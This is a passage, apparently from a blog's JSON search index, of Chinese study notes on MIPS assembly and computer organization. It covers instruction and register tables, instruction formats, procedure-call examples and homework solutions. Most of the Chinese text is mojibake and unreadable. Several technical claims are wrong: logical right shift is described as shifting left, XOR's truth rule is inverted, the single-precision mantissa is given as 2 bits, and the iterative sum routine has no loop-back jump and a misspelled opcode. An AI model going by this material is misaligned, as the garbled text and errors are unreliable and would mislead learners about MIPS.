å‚è€ƒé“¾æ¥\n\nhttps://www.runoob.com/pandas/pandas-csv-file.html\n\nhttps://www.runoob.com/w3cnote/matplotlib-tutorial.html\n\nhttps://www.runoob.com/numpy/numpy-tutorial.html\n\nhttps://www.runoob.com/matplotlib/matplotlib-pie.html\n\nhttps://juejin.cn/post/7031475009688191007\n\nhttps://blog.csdn.net/weixin_35757704/article/details/126965333\n\nè¿˜æœ‰zç¥çš„å®éªŒæŠ¥å‘ŠğŸ¤—\n","tags":["class","python"]},{"title":"è®¡ç»„è¡¥å¤©","url":"/2022/12/16/è®¡ç»„è¡¥å¤©/","content":"# ç¬¬äºŒç« \n\n## MIPSæŒ‡ä»¤\n\n| æŒ‡ä»¤                                       | ç¤ºä¾‹              | å«ä¹‰                            | æ³¨é‡Š                                   |\n| ------------------------------------------ | ----------------- | ------------------------------- | -------------------------------------- |\n| åŠ æ³•                                       | add $s1,$s2,$s3   | $s1=$s2+$s3                     |                                        |\n| å‡æ³•                                       | sub $s1,$s2,$s3   | $s1=$s2-$s3                     |                                        |\n| ç«‹å³æ•°åŠ æ³•                                 | addi $s1,$s2,20   | $s1=$s2+20                      | ç«‹å³æ•°å³å¸¸æ•°                           |\n| ä¹˜æ³•                                       | mul $s1,$s2,$s3   | $s1=$s2*$s3                     |                                        |\n| å–ç«‹å³æ•°                                   | li $s0,5          | int $s0 = 5                     |                                        |\n| å–å­—ç¬¦ä¸²                                   | la $a0,space      | char $a0 = \" \"                  | spaceéœ€è¦åœ¨å¼€å¤´å®šä¹‰                    |\n| èµ‹å€¼                                       | move $t0,$t1      |                                 | å°†å¯„å­˜å™¨$t1ä¸­çš„æ•°æ®ä¼ é€è‡³$t0           |\n| è¾“å‡º                                       | syscall           | å°†$a0å†…çš„å†…å®¹è¾“å‡º               |                                        |\n| å–å­—                                       | lw $s1,20($s2)    | $s1=Memory[$s2+20]å³a=b[5]      | æ‹¬å·å¤–çš„å­—èŠ‚æ•°åªèƒ½ç”¨å¸¸æ•°ï¼Œç”¨äºå–æ•°ç»„å€¼ |\n| å­˜å­—                                       | sw $s1,20($s2)    | Memory[$s2+20]=$s1å³b[5]=a      | ç”¨äºå¯¹æ•°ç»„èµ‹å€¼                         |\n| å–åŠå­—                                     | lh $s1,20($s2)    | $s1=Memory[$s2+20]              | å–å­—æ˜¯è¯¥åœ°å€åå››ä¸ªå­—èŠ‚ï¼ŒåŠå­—åˆ™ä¸¤ä¸ªå­—èŠ‚ |\n| å–æ— ç¬¦å·åŠå­—                               | lhu $s1,20($s2)   | $s1=Memory[$s2+20]              | é¡¾åæ€ä¹‰ï¼Œæ— ç¬¦å·                       |\n| å­˜åŠå­—                                     | sh $s1,20($s2)    | Memory[$s2+20]=$s1              |                                        |\n| å–å­—èŠ‚                                     | lb $s1,20($s2)    | $s1=Memory[$s2+20]              | å–ä¸€ä¸ªå­—èŠ‚                             |\n| å–æ— ç¬¦å·å­—èŠ‚                               | lbu $s1,20($s2)   | $s1=Memory[$s2+20]              |                                        |\n| å­˜å­—èŠ‚                                     | sb $s1,20($s2)    | Memory[$s2+20]=$s1              |                                        |\n| *å–é“¾æ¥å­—*                                 | *ll $s1,20($s2)*  | *$s1=Memory[$s2+20]*            |                                        |\n| *å­˜æ¡ä»¶å­—*                                 | *sc $s1,20($s2)*  | *Memory[$s2+20]=$s1;$s1=o or 1* |                                        |\n| *å–ç«‹å³æ•°çš„é«˜ä½*                           | *lui $s1,20*      | *$s1=20*2^16*                   |                                        |\n| ä¸                                         | and $s1,$s2,$s3   | $s1=$s2 & $s3                   | æŒ‰ä½ä¸                                 |\n| æˆ–                                         | or $s1,$s2,$s3    | $s1=$s2 \\| $s3                  | æŒ‰ä½æˆ–                                 |\n| æˆ–é                                       | nor $s1,$s2,$s3   | $s1=~($s2 \\| $s3)               | æŒ‰ä½æˆ–é                               |\n| å¼‚æˆ–                                       | xor $s1,$s2,$s3   | å¼‚æˆ–                            | å¼‚æˆ–                                   |\n| ç«‹å³æ•°ä¸                                   | andi $s1,$s2,20   | $s1=$s2 & 20                    |                                        |\n| ç«‹å³æ•°æˆ–                                   | ori $s1,$s2,20    | $s1=$s2 \\| 20                   |                                        |\n| é€»è¾‘å·¦ç§»                                   | sll $s1,$s2,10    | $s1=$s2<<10                     | å·¦ç§»nä½ç­‰åŒäºä¹˜2^n                     |\n| é€»è¾‘å³ç§»                                   | srl $s1,$s2,10    | $s1=$s2>>10                     | é™¤2^n                                  |\n| ç›¸ç­‰æ—¶è·³è½¬                                 | beq $s1,$s1,Else  | if($s1==$s2) go to Else         | Elseä¸€èˆ¬æ˜¯åé¢å®šä¹‰çš„ä¸€ä¸ªæ ‡ç­¾           |\n| ä¸ç›¸ç­‰æ—¶è·³è½¬                               | bne $s1,$s1,Else  | if($s1!=$s2) go to Else         |                                        |\n| å°äºæ—¶ç½®ä½                                 | slt $s1,$s2,$s3   | if($s2<$s3) $s1=1;else $s1=0    | å‰å°äºååˆ™èµ‹1                          |\n| **æ— ç¬¦å·æ•°**æ¯”è¾ƒå°äºæ—¶ç½®ä½                 | sltu $s1,$s2,$s3  | if($s2<$s3) $s1=1;else $s1=0    | æ— ç¬¦å·æ•°                               |\n| **æ— ç¬¦å·æ•°**æ¯”è¾ƒå°äº**ç«‹å³æ•°**æ—¶ç½®ä½       | slti $s1,$s2,$s3  | if($s2<20) $s1=1;else $s1=0     | æ¯”è¾ƒæ˜¯å¦å°äºå¸¸æ•°                       |\n| **æ— ç¬¦å·æ•°**æ¯”è¾ƒå°äº**æ— ç¬¦å·ç«‹å³æ•°**æ—¶ç½®ä½ | sltiu $s1,$s2,$s3 | if($s2<20) $s1=1;else $s1=0     | æ¯”è¾ƒæ˜¯å¦å°äºæ— ç¬¦å·å¸¸æ•°                 |\n| è·³è½¬                                       | j 2500            | go to 10000                     | å½“ç„¶æ ‡ç­¾ä¹Ÿå¯ä»¥                         |\n| è·³è½¬è‡³å¯„å­˜å™¨æ‰€æŒ‡ä½ç½®                       | jr $ra            | go to $ra                       | ç”¨äºswitchä»¥åŠè¿‡ç¨‹è°ƒç”¨                 |\n| è·³è½¬å¹¶ä¸”é“¾æ¥                               | jal 2500          | $ra=PC+4;go to 10000            | ç”¨äºè¿‡ç¨‹è°ƒç”¨                           |\n\n## 32ä½å¯„å­˜å™¨\n\n| è¡¨ç¤º    | ä½œç”¨                         | æ³¨é‡Š                                            | ä½ç½®       |\n| ------- | ---------------------------- | ----------------------------------------------- | ---------- |\n| $zero   | å¯„å­˜å™¨çš„å€¼æ’ä¸º0              |                                                 | 1          |\n| $v0~$v1 | è®¡ç®—ç»“æœï¼Œè¿”å›å€¼             | ç”¨äºè¿”å›å€¼                                      | 2~3        |\n| $a0~$a3 | ç”¨äºè¿›å…¥å‡½æ•°æ—¶ä¼ é€’å‚æ•°       |                                                 | 4~7        |\n| $s0~$s7 | ä¿ç•™å¯„å­˜å™¨                   | ä¸€èˆ¬å­˜ä¸€äº›é‡è¦çš„å€¼                              | 16~23      |\n| $t0~$t9 | ä¸´æ—¶å¯„å­˜å™¨                   | å…¶å®ƒå‡½æ•°æˆ–å¾ªç¯ç­‰ä¸­çš„ä¸´æ—¶å˜é‡                    | 8~15,24~25 |\n| $at     | æ±‡ç¼–å™¨ä¿ç•™ï¼Œç”¨äºå¤„ç†å¤§çš„å¸¸æ•° |                                                 |            |\n| $sp     | æ ˆæŒ‡é’ˆ                       | è¿›å…¥å…¶å®ƒå‡½æ•°æ—¶                                  | 29         |\n| $ra     | è¿”å›æŒ‡é’ˆ                     | ç”¨äºè¿”å›èµ·å§‹ç‚¹çš„è¿”å›åœ°å€å¯„å­˜å™¨                  | 31         |\n| $gp     | å…¨å±€æŒ‡é’ˆ                     | æŒ‡å‘é™æ€æ•°æ®åŒºçš„ä¿ç•™å¯„å­˜å™¨,å…¨å±€å˜é‡æˆ–staticå˜é‡ |            |\n| $fp     | å¸§æŒ‡é’ˆ                       |                                                 |            |\n| $k0~$k1 |                              |                                                 |            |\n\n## æœºå™¨æŒ‡ä»¤\n\n### Rå‹\n\nopä¸functä¸º**å…­ä½**ï¼Œå…¶ä»–**äº”ä½**ï¼ŒåŠ èµ·æ¥æ­£å¥½**ä¸‰åäºŒä½**\n\n| ä¾‹                | op(æ“ä½œç ) | rs(æ“ä½œæ•°å¯„å­˜å™¨) | rt(æ“ä½œæ•°å¯„å­˜å™¨) | rd(ç›®çš„å¯„å­˜å™¨) | shamt(ä½ç§»é‡) | funct(åŠŸèƒ½ç ) |\n| ----------------- | ---------- | ---------------- | ---------------- | -------------- | ------------- | ------------- |\n| add $t0, $s1, $s2 | 0          | 17(**$s1**)      | 18(**$s2**)      | 8(**$t0**)     | 0             | 32            |\n| sub               | 0          | reg              | reg              | reg            | 0             | 34            |\n\n### Iå‹\n\nå› rdå¯„å­˜å™¨åªæœ‰äº”ä½(**<32**)ï¼Œé™åˆ¶å¤ªå¤§ï¼Œæ•…è®¾è®¡**Iå‹**\n\nconstant or addressåŒ…å«rd,shamt,functï¼Œæ‰€ä»¥åå…­ä½\n\n**rtå˜ä¸ºç›®çš„å¯„å­˜å™¨**\n\n| ä¾‹              | op   | rs   | rt   | constant or address |\n| --------------- | ---- | ---- | ---- | ------------------- |\n| addi            | 8    | reg  | reg  | **address**         |\n| lw              | 35   | reg  | reg  | **address**         |\n| sw              | 43   | reg  | reg  | **address**         |\n| lw $t0,300($t1) | 35   | 9    | 8    | 1200(**300 * 4**)   |\n\n**address**è¡¨ç¤ºåå…­ä½åœ°å€\n\n## é€»è¾‘æ“ä½œ\n\n### ç§»ä½(>><<)\n\né€»è¾‘å·¦ç§» (sll)ï¼šå°†ä¸€ä¸ªå­—é‡Œé¢çš„æ‰€æœ‰ä½éƒ½å‘å·¦ç§»åŠ¨ï¼Œå¹¶åœ¨ç©ºå‡ºæ¥çš„ä½ä¸Šå¡«å…… 0ã€‚\n\né€»è¾‘å³ç§» (srl)ï¼šå°†ä¸€ä¸ªå­—é‡Œé¢çš„æ‰€æœ‰ä½éƒ½å‘å·¦ç§»åŠ¨ï¼Œå¹¶åœ¨ç©ºå‡ºæ¥çš„ä½ä¸Šå¡«å…… 0ã€‚\n\nå·¦ç§» ğ‘– ä½å°±ç›¸å½“äºä¹˜ä»¥ 2^ğ‘–ï¼Œå³ç§»å³é™¤\n\n### æŒ‰ä½ä¸(AND)\n\nAND æä¾›äº†ä¸€ç§å°†æºæ“ä½œæ•°ä¸­æŸäº›ä½ç½®ä¸º0 çš„èƒ½åŠ›ï¼Œå‰ææ˜¯å¦ä¸€ä¸ªæ“ä½œæ•°ä¸­å¯¹åº”ä½ä¸º0ã€‚åä¸€ä¸ªæ“ä½œæ•°ä¼ ç»Ÿä¸Šè¢«ç§°ä¸ºæ©ç (mask) ï¼Œå¯“æ„å…¶å¯\"éšè—\"æŸäº›ä½ã€‚\n\nä¸Šä¸‹éƒ½ä¸º **1** åˆ™ç»“æœä¸º **1**\n\n### æŒ‰ä½æˆ–(OR)\n\nä¸Šä¸‹ä»»æ„ä¸€æ•°ä¸º **1** åˆ™ç»“æœä¸º **1**\n\n### æŒ‰ä½å–å(NOT)\n\nå¯¹ä¸€ä¸ªæ•°è¿›è¡Œæ“ä½œï¼Œ1å˜æˆ0ï¼Œ0å˜æˆ1\n\n### æˆ–é(NOT OR)\n\né¡¾åæ€ä¹‰ï¼Œå…ˆ**æˆ–**å†**å–å**\n\n### å¼‚æˆ–(XOR)\n\nç›¸åŒç½®1ï¼Œä¸ç›¸åŒç½®0\n\n## ç¤ºä¾‹\n\n### å¶è¿‡ç¨‹\n\n> C ç¨‹åº\n>\n> ```c\n> int leaf_example (int g, int h, int i, int j)\n> {\n> \tint f;\n> \tf = (g + h) - (i + j);\n> \treturn f;\n> }\n> ```\n>\n> ç¼–è¯‘åçš„MIPS æ±‡ç¼–ä»£ç æ˜¯ä»€ä¹ˆå‘¢?\n>\n> å‚æ•°å˜é‡ g ã€h ã€i å’Œ j å¯¹åº”å‚æ•°å¯„å­˜å™¨ $a0 ã€$a1 ã€$a2 å’Œ$a3ï¼Œf å¯¹åº” $s0\n> å‡å®šéœ€è¦ä¿ç•™$s0,$t0å’Œ$t1è¿™ä¸‰ä¸ªå¯„å­˜å™¨\n\n>  **è§£**\n>\n> ```gas\n> leaf_example:\t#å­ç¨‹åºåï¼Œæ ‡å·\n>     addi $sp,$sp,-12\t#å°†æ ˆæŒ‡é’ˆ$spå‘ä½åœ°å€å‹3ä¸ªå­—ç”¨äºä¿ç•™åŸå¯„å­˜å™¨çš„å€¼\n>     sw $t1, 8($sp)\n>     sw $t0, 4($sp)\n>     sw $s0, 0($sp)\t#ä¿å­˜åŸå€¼\n>     add $t0, $a0, $a1\t# register $t0 contains g+h\n>     add $t1, $a2, $a3\t# register $t1 contains i+j\n>     sub $s0, $t0, $t1 # f = (g + h) - (i + j)\n>     add $v0, $t0, $t1\t# å°†fçš„å€¼å­˜è¿›è¿”å›å€¼å¯„å­˜å™¨$v0ç”¨äºè¿”å›å€¼\n>     lw $s0, 0($sp)\n>     lw $t0, 4($sp)\n>     lw $t1, 8($sp)\t#æ¢å¤åŸå€¼\n>     addi $sp, $sp, 12\t#æ¢å¤æ ˆæŒ‡é’ˆåŸæ¥çš„ä½ç½®\n>     jr $ra\t#æ ¹æ®è·³è½¬å¯„å­˜å™¨ä¸­çš„è¿”å›åœ°å€è·³è½¬\n> ```\n>\n> æ ˆçš„ä½œç”¨å›¾\n>\n> <img src=\"image-20221216203055223.png\">\n\nè¿™ä¸ªè¿‡ç¨‹å¯å«åš**å¶è¿‡ç¨‹**ï¼Œå³ä¸è°ƒç”¨å…¶ä»–è¿‡ç¨‹çš„è¿‡ç¨‹\n\nä¸€èˆ¬æ¥è¯´\n\n| ä¿ç•™           | ä¸ä¿ç•™         |\n| -------------- | -------------- |\n| $s0~$s7        | $t0~$t9        |\n| $sp            | $a0~$a3        |\n| $ra            | $v0~$v1        |\n| æ ˆæŒ‡é’ˆä»¥ä¸Šçš„æ ˆ | æ ˆæŒ‡é’ˆä»¥ä¸‹çš„æ ˆ |\n\n### éå¶è¿‡ç¨‹\n\nå¦‚æœæ˜¯éå¶è¿‡ç¨‹ï¼Œå³è°ƒç”¨è¯¥è¿‡ç¨‹çš„ä¸­é€”ä¹Ÿè¦è°ƒç”¨å…¶ä»–è¿‡ç¨‹ï¼Œå¯èƒ½ä¼šå¯¼è‡´å¯„å­˜å™¨ä½¿ç”¨å†²çª\n\nè§£å†³æ–¹æ³•å°±æ˜¯**å°†æ‰€æœ‰å¿…é¡»ä¿ç•™çš„å¯„å­˜å™¨å‹æ ˆ**\n\n* **è°ƒç”¨è€…**å°†æ‰€æœ‰è°ƒç”¨åè¿˜éœ€è¦çš„å‚æ•°å¯„å­˜å™¨ ($a0 - $a3) æˆ–ä¸´æ—¶å¯„å­˜å™¨ ($t0 - $t9) å‹æ ˆ\n* **è¢«è°ƒç”¨è€…**å°†è¿”å›åœ°å€å¯„å­˜å™¨$raå’Œè¢«è°ƒç”¨è€…ä½¿ç”¨çš„ä¿ç•™å¯„å­˜å™¨( $s0 - $s7) éƒ½å‹æ ˆ\n* **æ ˆæŒ‡é’ˆ$sp**éšç€æ ˆä¸­å¯„å­˜å™¨ä¸ªæ•°è°ƒæ•´ã€‚åˆ°è¿”å›æ—¶ï¼Œå¯„å­˜å™¨ä¼šä»å­˜å‚¨å™¨ä¸­æ¢å¤ï¼Œæ ˆæŒ‡é’ˆä¹Ÿéšç€é‡æ–°è°ƒæ•´ã€‚\n\n#### **é€’å½’è¿‡ç¨‹**\n\né‡å¤è°ƒç”¨å‡½æ•°\n\n> ä¸‹é¢æ˜¯ä¸€ä¸ªè®¡ç®—é˜¶ä¹˜çš„é€’å½’è¿‡ç¨‹:\n>\n> ```c\n> int fact (int n) {\n> \tif(n<1) \n>         return(1);\n> \telse \n>         return ( n * fact(n -1));\n> }\n> ```\n>\n> è¯¥è¿‡ç¨‹çš„MIPS æ±‡ç¼–ä»£ç æ˜¯æ€æ ·çš„å‘¢?\n\n> **è§£**\n>\n> ```gas\n> fact:\n> \taddi $sp, $sp, -8\t\n> \tsw $ra, 4($sp)\t#æ ¹æ®ä¸Šè¿°å¶è¿‡ç¨‹éœ€ä¿ç•™ $ra\n> \tsw $a0, 0($sp)\t#åŒæ ·ï¼Œå‚æ•°å¯„å­˜å™¨ $a0(<==>n) ä¹Ÿéœ€è¦ä¿ç•™\n> \tslti $t0, $a0, 1\t# $a0 < 1 æ—¶ $t0 ç½® 1\n> \tbeq $t0, $zero, L1\t# if $t0 == 0, go to L1, else(å³$t0 == 1) åˆ™ç»§ç»­\n> \taddi $v0, $zero, 1\t#retutn 1\n> \taddi $sp, $sp, 8\t#å¹¶æœªè¿›å…¥å…¶ä»–è¿‡ç¨‹ï¼Œæ‰€ä»¥ç›´æ¥å¼¹æ ˆè¿”å›å³å¯\n> \tjr $ra\t#return\n> \tL1:\n> \t\taddi $a0, $a0, -1 # gets n - 1\n> \t\tjal fact\t# call fact with (n - 1)\n> \tlw $a0, 0($sp)\t#æ¥ä¸‹æ¥çš„éƒ¨åˆ†å±äº fact\n> \tlw $ra, 4($sp)\n> \taddi $sp, $sp, 8\t#åµŒå¥—äº†å…¶ä»–è¿‡ç¨‹ï¼Œæ‰€ä»¥å…¶ä»–è¿‡ç¨‹è¿›è¡Œå®Œåè¦æ¢å¤åŸå€¼\n> \tmul $v0, $a0, $v0\t#å°†ä¸Šä¸€è¿‡ç¨‹çš„è¿”å›å€¼ä¹˜ n æ¥å¾—åˆ°ç°åœ¨è¿‡ç¨‹çš„è¿”å›å€¼\n> \tjr $ra\t#return\n> ```\n>\n> \n\n#### **è¿­ä»£è¿‡ç¨‹**\n\n**å¾ªç¯æŸä¸€è¿‡ç¨‹**è€Œéå¾ªç¯è¿›å…¥å‡½æ•°\n\n> è€ƒè™‘ä¸‹é¢ä¸€ä¸ªç”¨æ¥æ±‚å’Œçš„è¿‡ç¨‹:\n>\n> ```c\n> int sum (int n, int acc) {\n> \tif (n>0)\n> \t\treturn sum (n â€“ 1, acc + n) ;\n> \telse\n> \t\treturn acc;\n> }\n> ```\n>\n> è¯¥è¿‡ç¨‹çš„MIPS æ±‡ç¼–ä»£ç æ˜¯æ€æ ·çš„å‘¢?\n\n> **è§£**\n>\n> åˆ†æä¸€ä¸‹å¯çŸ¥ï¼Œå¦‚æœ **n>0** åˆ™ä»¤ **n-1** å¹¶ä¸”ä½¿ **acc+n**\n>\n> å®Œå®Œå…¨å…¨å¯ä»¥ç”¨å¾ªç¯ä»£æ›¿\n>\n> **å‡è®¾ $a0 = n  $a1 = acc**\n>\n> ```gas\n> sum:\n> \tslit $t0, $a0, 1\t# $a0 < 1 æ—¶ $t0 ç½® 1\n> \tbne $t0, $zero, sum_exit\t# if $t0 == 0 , go to sum_exit\n> \tadd $a1, $a1, $a0\t# acc = acc + n\n> \taddi $a0, $a0, -1\t# go to sum\n> sum_exit:\n> \tadd $v0, $a1, $zero\t#return acc\n> \tjr $ra\t#return\n> ```\n>\n> \n\n### å­—ç¬¦æ“ä½œ\n\nä¸€ä¸ª **char** ä¸€å­—èŠ‚ï¼Œå…«æ¯”ç‰¹ï¼Œæœ€é«˜è¡¨ç¤º **127**ï¼Œå³**ASCII**ç çš„127ä½\n\næ‰€ä»¥å¯¹å­—ç¬¦ä¸²çš„æ“ä½œä¸€èˆ¬æ˜¯ **lb(å­—èŠ‚è¯»å–) sb(å­—èŠ‚å­˜å‚¨)**\n\n> Cè¯­è¨€\n>\n> ```c\n> void strcpy (char x[], char y[]) {\n>     int i;\n>     i = 0;\n>     while ((x[i] = y[i]) != '\\0')\n>         i += 1;\n> }\n> ```\n>\n> ç¼–è¯‘åçš„MIPSæ±‡ç¼–ä»£ç æ˜¯ä»€ä¹ˆï¼Ÿ\n\n> **è§£**\n>\n> å‡å®šæ•°ç»„ x å’Œ y çš„åŸºåœ°å€åœ¨ $a0 å’Œ $a1 ä¸­ï¼Œè€Œ i åœ¨ $s0 ä¸­\n>\n> strcpy è°ƒæ•´æ ˆæŒ‡é’ˆç„¶åå°†ä¿å­˜çš„å¯„å­˜å™¨ $s0 ä¿å­˜åœ¨æ ˆä¸­\n>\n> ```gas\n> strcpy:\n> \taddi $sp, $sp, -4\n> \tsw $s0, 0($sp)\n> \tadd $s0, $zero, $zero\t# åˆå§‹åŒ– i\n> \tL1:\n> \t\tadd $t1, $s0, $a1\t# get address y[i]\n> \t\tlbu $t2, 0($t1)\t# $t2 = y[i] å¾—åˆ°ç¬¬ i ä¸ªå­—ç¬¦\n> \t\tadd $t3, $s0, $a0\t# get address x[i]\n> \t\tsb $t2, 0($t3)\t# x[i] = y[i]\n> \t\tbeq $t2, $zero, L2 # if y[i] == 0 , go to L2\n> \t\taddi $s0, $s0, 1\t# i = i + 1\n> \t\tj L1\t# ä¸æ˜¯åˆ™ç»§ç»­å¾ªç¯ L1\n> \tL2:\n> \t\tlw $s0, 0($sp)\n> \t\taddi $sp, $sp, 4\n> \t\tjr $ra\t#return\n> ```\n>\n> \n\n\n\n## æ³¨æ„\n\n* ä¸€ä¸ªå­—å››ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªå­—èŠ‚å…«æ¯”ç‰¹\n* è´Ÿæ•°ä¸€èˆ¬ç”¨è¡¥ç è¡¨ç¤º(**å–åå +1**)\n* æ— ç¬¦å·æ•°å³æŠŠç¬¦å·ä½ä¹Ÿå½“æˆä¸€ä½æ•°ï¼Œå¦‚-1çš„æ— ç¬¦å·æ•°ä¸ºä¸º**4294967295**\n* å¦‚æœå‚æ•°å¤šäºå‚æ•°å¯„å­˜å™¨çš„æ•°é‡(**4**)ï¼Œ**MIPS**çº¦å®šå°†é¢å¤–å‚æ•°æ”¾åœ¨**æ ˆæŒ‡é’ˆçš„ä¸Šæ–¹**\n\n### åˆ©ç”¨æ— ç¬¦å·æ•°è¿›è¡Œè¾¹ç•Œæ£€æŸ¥\n\nå¯é™ä½æ£€éªŒä¸‹æ ‡æ˜¯å¦è¶Šç•Œçš„å¼€é”€\n\n```gas\nsltu $t0, $s1, $t2\t# $t0=0 if $s1 >= $t2 or $s1 <0\nbeq $t0, $zero, IndexOutOfBounds\t#if bad , goto Error\n```\n\n# ç¬¬ä¸‰ç« \n\n## åŠ å‡æ³•\n\n### æº¢å‡º\n\nç”±äºå­—å®½åªæœ‰32ä½ï¼Œæ‰€ä»¥åœ¨è¿ç®—ä¸­ä¼šå‘ç”Ÿæº¢å‡º\n\n```php\n\t0100 0000 0000 0000 0000 0000 0000 0111\n+\t0100 0000 0000 0000 0000 0000 0000 0110\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\n=\t1000 0000 0000 0000 0000 0000 0000 1101\n```\n\næº¢å‡ºä¼šå¯¼è‡´å¼‚å¸¸\n\n**åŒå·çš„æ•°ç›¸å‡ï¼Œä¸ä¼šæº¢å‡º**\n\n**å¼‚å·çš„æ•°ç›¸åŠ ï¼Œä¸ä¼šæº¢å‡º**\n\nå¯¹æ— ç¬¦å·æ•°å¤„ç†çš„ç®—æœ¯æŒ‡ä»¤ï¼Œä¸ä¼šäº§ç”Ÿå¼‚å¸¸(**addu,addiu,subu...**)\n\n### æº¢å‡ºçš„åˆ¤æ–­\n\n**æœ‰ç¬¦å·åŠ æ³•**\n\nè‹¥è¾“å…¥çš„ä¸¤æ•°æ®ç¬¦å·ä½ç›¸åŒï¼Œè€Œè¾“å‡ºçš„æ•°æ®ç¬¦å·ä½ä¸å‰æ•°æ®ä¸åŒï¼Œåˆ™é‰´å®šä¸ºæº¢å‡ºï¼ŒæŠ›å‡ºå¼‚å¸¸\n\nå…¶ä»–åŒç†\n\n## ä¹˜æ³•\n\nåè¿›åˆ¶ä¸‹ **1000 Ã— 1001**\n\n```php\n\t\t\t1000\nÃ—\t\t\t1001\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\n\t\t\t1000\n\t\t   0000\n\t\t  0000\n\t\t 1000\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\n\t\t 1001000\n```\n\n<img src=\"image-20221217162459269.png\">\n\nçœ‹ä¸å¤ªæ‡‚è¿™ä¸ªå›¾ï¼Œåæ­£å°±é‚£æ„æ€ğŸ˜£\n\n## é™¤æ³•\n\n<img src=\"image-20221217163016072.png\">\n\nä¸¤è€…å¯¹äºç¬¦å·ä½çš„å¤„ç†éƒ½æ˜¯ï¼Œ**åŒå·ä¸ºæ­£ï¼Œå¼‚å·ä¸ºè´Ÿ**\n\n## æµ®ç‚¹æ•°\n\n**å•ç²¾åº¦æµ®ç‚¹æ•°**ï¼š**æŒ‡æ•°åŸŸ**8ä½ï¼Œ**å°¾æ•°åŸŸ**2ä½ï¼Œ**ç¬¦å·**1ä½ã€‚\n\n# è®¡ç»„å¤§ä½œä¸š\n\n## ç¬¬ä¸€é¢˜\n\n> å°†ä¸‹é¢çš„Cä»£ç ç¿»è¯‘ä¸ºMIPSæ±‡ç¼–ä»£ç ã€‚è¦æ±‚ä½¿ç”¨çš„æŒ‡ä»¤æ•°ç›®æœ€å°‘ã€‚å‡è®¾å€¼aã€bã€iå’Œjåˆ†åˆ«å­˜æ”¾åœ¨å¯„å­˜å™¨$s0ã€$s1ã€$t0å’Œ$t1ä¸­ã€‚å¦å¤–å‡è®¾å¯„å­˜å™¨$s2ä¸­å­˜æ”¾ç€æ•°ç»„Dçš„åŸºåœ°å€\n>\n> ```c\n> for (i =0 ; i < a; i++) {\n> \tfor (j = 0; j < b; j++) {\n> \t\tD[4*j] = i + j;\n> \t}\n> }\n> ```\n>\n> \n\n\n\n> **è§£**\n>\n> è®¾å®ša=10,b=10,å®Œæˆæ•°ç»„D[]çš„æ›´æ–°ï¼Œå¹¶è¾“å‡ºæ•°ç»„ä¿¡æ¯ï¼›\n>\n> ```gas\n> # Author: è‚–ç£Š\n> # Date: 2022-12-17\n> .data\n> \n> array_D: .space 160\n> updateMsg: .asciiz \"update:\"\n> line: .asciiz \"\\n\"\n> space: .asciiz \" \"\n> \n> .text\n> main:\n> \t# save a, b, D[]\n> \taddi $sp, $sp, -12\n> \tsw $s0, 8($sp)\n> \tsw $s1, 4($sp)\n> \tsw $s2, 0($sp)\n> \n> \t#initialization\n> \taddi $s0, $zero, 10\t# a = 10\n> \taddi $s1, $zero, 10\t# b = 10\n> \tla $s2, array_D\t# D with 160 space\n> \tli $t0, 0\t# int i = 0\n> \n> \tfirst_loop:\n> \t\t# if i < a\n> \t\tbge $t0, $s0, loop1_exit\t# bge if $t0 â‰¥ $s0 , j loop1_exit\n> \t\tli $t1, 0\t# int j = 0\n> \t\tsecond_loop:\n> \t\t\t# if j < b\n> \t\t\tbge $t1, $s1, loop2_exit\n> \t\t\tadd $t2, $t0, $t1\t# i + j\n> \t\t\tsll $t3, $t1, 4\t# t3 = 4 * 4 * j\n> \t\t\tadd $t3, $t3, $s2\t# address of D[4 * j]\n> \t\t\tsw $t2, 0($t3)\t# D[4 * j] = i + j\n> \t\t\taddi $t1, $t1, 1\t# j++\n> \t\t\tj second_loop\n> \t\tloop2_exit:\n> \t\t\t# print updateMsg\n> \t\t\tli $v0, 4\n> \t\t\tla $a0, updateMsg\n> \t\t\tsyscall\n> \t\t\t# print array\n> \t\t\tjal print_array\n> \t\t\taddi $t0, $t0, 1\t# i++\n> \t\t\tj first_loop\n> \tloop1_exit:\n> \t\tlw $s2, 8($sp)\n> \t\tlw $s1, 4($sp)\n> \t\tlw $s0, 0($sp)\n> \t\taddi $sp, $sp, 12\n> \t\tli $v0, 10\n> \t\tsyscall\n> \n> print_array:\n> \tmove $t2, $s2\t# $t2 = D[]\n> \tli $t1, 0\t# $t1 = k\n> \tprint_loop:\n> \t\tli $t3, 40\n> \t\tbge $t1, $t3, loop_done\t# if k â‰¥ 40, done\n> \t\t# array\n> \t\tli $v0, 1\n> \t\tlw $t4, 0($t2)\n> \t\tmove $a0, $t4\n> \t\tsyscall\n> \t\t# space\n> \t\tli $v0, 4\n> \t\tla $a0, space\n> \t\tsyscall\n> \t\t# next loop\n> \t\taddi $t2, $t2, 4\n> \t\taddi $t1, $t1, 1\n> \t\tj print_loop\n> \tloop_done:\n> \t\t# next line\n> \t\tli $v0, 4\n> \t\tla $a0, line\n> \t\tsyscall\n> \t\tjr $ra\n> ```\n>\n> ç»æµ‹è¯•æ— è¯¯\n>\n> <img src=\"image-20221218144728404.png\">\n\n## ç¬¬äºŒé¢˜\n\n> å®Œæˆæ–å¥‡é‚£æ³¢æ•°åˆ— **F[n] = F[n-1] + F[n-2]**ï¼Œè®¾å®šä»»æ„çš„nå€¼ï¼Œå¹¶å®ç°æ•°åˆ—è¾“å‡º\n>\n> è€ƒè™‘åˆ°æ•°åˆ—åªéœ€è¦è¾“å‡ºè€Œæ— éœ€ä¿å­˜ï¼Œå†™å‡ºCä»£ç \n>\n> ```c\n> int t0 = 0;\n> int t1 = 1;\n> int i = 0;\n> while (i < n) {\n> \tprintf(\"%d\",t0);\n> \tint t2 = t0 + t1;\n> \tt0 = t1;\n> \tt1 = t2;\n> \ti ++;\n> }\n> ```\n>\n> ç”±ä»¥ä¸ŠCä»£ç å†™å‡ºæ±‡ç¼–ä»£ç \n\n\n\n> **è§£**\n>\n> ```gas\n> #Author: è‚–ç£Š\n> #Date: 2022-12-18\n> \n> .data\n> input_msg: .asciiz \"Please input n: 